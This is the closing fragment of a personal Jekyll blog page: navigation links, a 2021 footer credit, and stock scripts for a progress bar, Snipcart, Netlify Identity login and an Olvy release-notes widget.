href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
